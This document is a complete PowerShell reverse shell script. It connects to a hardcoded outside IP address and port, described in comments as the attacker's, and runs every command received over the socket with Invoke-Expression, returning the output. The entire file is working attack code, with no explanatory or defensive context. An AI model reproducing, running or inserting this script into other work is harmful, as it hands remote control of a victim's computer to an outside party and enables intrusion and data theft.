$ip = "147.185.221.20" # Change this to the attacker's IP address
$port = 10626        # Change this to the attacker's listening port

$client = New-Object System.Net.Sockets.TCPClient($ip,$port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

$writer.Write("[*] Connected to $ip:$port")
$writer.Flush()

while ($true) {
    $writer.Write("PS> ")
    $writer.Flush()
    $len = $stream.Read($buffer, 0, 1024)
    $command = $encoding.GetString($buffer, 0, $len).Trim()
    
    try {
        $output = Invoke-Expression $command 2>&1 | Out-String
    } catch {
        $output = $_.Exception.Message
    }
    
    $writer.WriteLine($output)
    $writer.Flush()
}

$writer.Close()
$stream.Close()
$client.Close()
